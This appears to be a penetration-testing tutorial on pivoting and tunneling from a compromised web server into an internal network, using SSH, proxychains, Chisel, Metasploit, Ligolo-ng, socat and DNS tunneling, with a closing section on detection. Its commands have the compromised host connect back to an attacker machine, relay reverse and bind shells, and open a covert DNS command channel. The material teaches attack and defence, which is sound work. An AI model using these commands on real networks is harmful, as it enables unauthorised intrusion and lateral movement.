# Pivoting and Tunneling

You've compromised a machine. It can talk to things you can't reach from your attacker box. Pivoting is how you use that compromised host as a relay to access those internal systems. Tunneling is how you route your traffic through that relay in a way that works within the constraints of the network.

This post covers the main techniques: SSH tunneling, proxychains, Chisel, Metasploit's routing, Ligolo-ng, socat, and DNS tunneling.

---

## The Scenario

Picture a typical segmented network:

```
[Attacker] --> (internet) --> [DMZ Web Server] --> (internal) --> [10.10.10.0/24]
```

You've popped the web server. From your machine, you can't reach anything on `10.10.10.0/24` directly. But the web server can. Your goal is to route your Nmap scans, Impacket tools, and browser traffic through the web server to reach internal hosts.

---

## SSH Tunneling

SSH is the most reliable tunneling tool because it's almost always available and almost never blocked. There are three main modes.

### Local Port Forwarding (-L)

Forwards a local port on your attacker machine to a destination reachable from the SSH server.

```bash
ssh -L 8080:10.10.10.5:80 user@webserver
```

After running this, connecting to `localhost:8080` on your machine sends traffic through the SSH session to `10.10.10.5:80`. The web server is the intermediary. Useful for accessing a single internal service.

You can bind multiple `-L` flags in one SSH command:

```bash
ssh -L 8080:10.10.10.5:80 -L 4433:10.10.10.5:443 user@webserver
```

### Remote Port Forwarding (-R)

Forwards a port on the remote SSH server back to a destination on your side. This is useful when your machine isn't directly reachable from the pivot host (common in NAT-heavy environments).

```bash
ssh -R 9001:localhost:4444 user@webserver
```

Now, if the web server connects to `localhost:9001`, that traffic comes back to port 4444 on your machine. Useful for catching reverse shells when the target can reach your SSH server but not your machine directly.

### Dynamic Port Forwarding (-D)

This is the most flexible option. It creates a SOCKS proxy on your local machine and routes all traffic through it via the SSH server.

```bash
ssh -D 1080 user@webserver
```

Now `localhost:1080` is a SOCKS5 proxy. Route any tool through it using proxychains (see below) to reach the internal network. This is the mode you'll use most for general pivoting.

Add `-N` to suppress shell execution (just tunnel, no interactive session) and `-f` to fork to background:

```bash
ssh -D 1080 -N -f user@webserver
```

---

## Proxychains

Proxychains intercepts network calls from any tool and routes them through a SOCKS or HTTP proxy. Combined with an SSH dynamic forward, it lets you run almost any tool against internal hosts.

Configure `/etc/proxychains.conf` (or `/etc/proxychains4.conf` depending on the version):

```
[ProxyList]
socks5 127.0.0.1 1080
```

Then prefix any command with `proxychains`:

```bash
proxychains nmap -sT -Pn 10.10.10.5
proxychains psexec.py domain/user:password@10.10.10.5
proxychains firefox
```

A few important caveats. UDP doesn't work through SOCKS proxies, so UDP-based tools (standard Nmap SYN scans, DNS, etc.) need workarounds. Use `-sT` (TCP connect) with Nmap instead of the default SYN scan. ICMP also doesn't work, so use `-Pn` to skip host discovery.

The `quiet_mode` option in proxychains.conf suppresses the per-connection output that clutters your terminal.

---

## Chisel

[Chisel](https://github.com/jpillora/chisel) is a fast TCP/UDP tunnel transported over HTTP (and optionally secured with TLS). It's particularly useful in environments where only HTTP or HTTPS traffic is allowed outbound, which is common in corporate environments with egress filtering.

Chisel works in a server/client model. You run the server on your attacker machine, and the client on the compromised host.

### Setting up a SOCKS proxy with Chisel

On your attacker machine:

```bash
./chisel server -p 8000 --reverse
```

On the compromised host:

```bash
./chisel client attacker-ip:8000 R:socks
```

This creates a reverse SOCKS5 proxy on port 1080 on your attacker machine. Point proxychains at it and you're pivoting.

`R:` means reverse (the client initiates the connection to the server, useful when the compromised host is behind NAT). Without `R:`, the connection direction is server-to-client.

### Port forwarding with Chisel

```bash
# On attacker:
./chisel server -p 8000 --reverse

# On pivot:
./chisel client attacker-ip:8000 R:8080:10.10.10.5:80
```

Now `localhost:8080` on your machine forwards to `10.10.10.5:80` through the pivot.

Chisel binaries are available for Windows, Linux, and macOS. In a pinch, you can also use the Go HTTP transport to blend into normal web traffic.

---

## Metasploit Pivoting

If you have a Meterpreter session, Metasploit has built-in pivoting support.

### Autoroute

Add a route through a Meterpreter session:

```
msf6 > use post/multi/manage/autoroute
msf6 post(autoroute) > set SESSION 1
msf6 post(autoroute) > set SUBNET 10.10.10.0
msf6 post(autoroute) > run
```

Or directly from within a Meterpreter session:

```
meterpreter > run autoroute -s 10.10.10.0/24
```

After this, Metasploit modules will automatically route traffic destined for `10.10.10.0/24` through session 1.

### SOCKS proxy module

To route traffic from external tools (not just Metasploit modules), set up a SOCKS proxy:

```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run
```

With autoroute configured, external tools pointed at this SOCKS proxy on port 1080 will reach the internal network through your Meterpreter session.

---

## Ligolo-ng

[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) is one of the better modern pivoting tools. Instead of proxychains (which has issues with UDP and can be slow), Ligolo-ng creates a TUN interface directly on your attacker machine. Traffic destined for internal network ranges is routed through this interface and out through the agent on the compromised host.

From a usability standpoint, this means your tools work normally without any proxychains prefix. DNS works, UDP works (mostly), and the performance is noticeably better.

### Setup

On your attacker machine (needs root for TUN interface creation):

```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

On the compromised host:

```bash
./agent -connect attacker-ip:11601 -ignore-cert
```

Back in the Ligolo-ng console on your machine:

```
ligolo-ng >> session
# select the session
ligolo-ng >> tunnel_start --tun ligolo
```

Add a route on your machine:

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

Now `ping 10.10.10.5` from your attacker machine just works. No proxychains, no SOCKS, no workarounds.

Ligolo-ng is worth setting up for any engagement that involves significant internal network access. The proxychains workflow gets tedious fast.

---

## Double Pivoting

Sometimes you need to go through two hops to reach your target:

```
[Attacker] --> [Pivot 1: DMZ] --> [Pivot 2: Internal segment] --> [Target: Deeper segment]
```

The approach: establish your first tunnel to Pivot 1, then from Pivot 1 establish a second tunnel to Pivot 2. With SSH:

```bash
# First hop: SOCKS proxy through Pivot 1
ssh -D 1080 user@pivot1

# Second hop: through proxychains, SSH to Pivot 2 with another SOCKS proxy
proxychains ssh -D 1081 user@pivot2
```

Now point proxychains at port 1081 to reach the deeper network. Or adjust `/etc/proxychains.conf` to chain both proxies:

```
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

With Ligolo-ng, double pivoting requires running a second agent on Pivot 2 and setting up a listener on Pivot 1 to forward connections. The Ligolo-ng documentation covers this, and it's cleaner than chained proxychains once you've got it working.

---

## Port Forwarding with socat

`socat` is a Swiss-army tool for socket operations. It's often available on Linux systems and can do simple port forwarding without SSH:

```bash
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80
```

This listens on port 8080 on the pivot host and forwards every connection to `10.10.10.5:80`. Simple, effective, no encryption. Useful for forwarding a single port when SSH isn't available.

For a bind shell relay:

```bash
# On the pivot, forward connections to an internal target's bind shell
socat TCP-LISTEN:4444,fork TCP:10.10.10.20:4444
```

socat can also work with UDP:

```bash
socat UDP-LISTEN:53,fork UDP:10.10.10.1:53
```

---

## DNS Tunneling

In restrictive environments, sometimes only DNS traffic is allowed outbound. DNS tunneling encodes arbitrary data inside DNS queries and responses, effectively creating a data channel over DNS.

The two main tools:

**[iodine](https://github.com/yarrick/iodine):** Creates an actual IP tunnel over DNS. You get a proper network interface and can route TCP/UDP through it. Requires a domain you control and a DNS server you run.

```bash
# Server (on attacker machine with a domain):
iodined -f -c -P password 192.168.99.1 tunnel.yourdomain.com

# Client (on compromised host):
iodine -f -P password dns-server-ip tunnel.yourdomain.com
```

Once the tunnel is up, `192.168.99.2` (the client's tunnel IP) is reachable from your server.

**[dnscat2](https://github.com/iagox86/dnscat2):** Provides a command-and-control channel over DNS rather than a full IP tunnel. More of a C2 tool, good for covert communications. Doesn't require full IP routing setup.

DNS tunneling is slow (DNS isn't designed for bulk data transfer) and it generates unusual DNS traffic patterns that can be detected. But in environments where literally only DNS is allowed outbound, it can be the only option.

---

## Detection Perspective

Pivoting and tunneling generate distinctive patterns. Here's what defenders look for:

**SSH tunneling:** Long-lived SSH connections with sustained data transfer are unusual. SSH to a non-standard port or to a server that's never been connected to before should raise an alert. `-D` dynamic forwarding is especially suspicious if the SSH client isn't a known admin tool.

**Chisel/HTTP tunnels:** High-frequency HTTP requests with uniform payload sizes to a single endpoint look like tunneled traffic. TLS inspection can reveal unusual content inside HTTPS.

**DNS tunneling:** High query volume for a single domain, unusually long DNS queries, many TXT record queries, high entropy in query names. DNS logs will show thousands of queries that don't match cached domains.

**General pivoting:** The pivot host establishing outbound connections to internal hosts it doesn't normally communicate with, especially on admin ports. Firewall logs showing lateral connections from a DMZ host into internal segments.

Unusual long-lived connections on unexpected ports are often the simplest signal. An HTTP server that's been running for years suddenly maintaining a persistent TCP connection on port 8000 to an external IP is worth investigating.
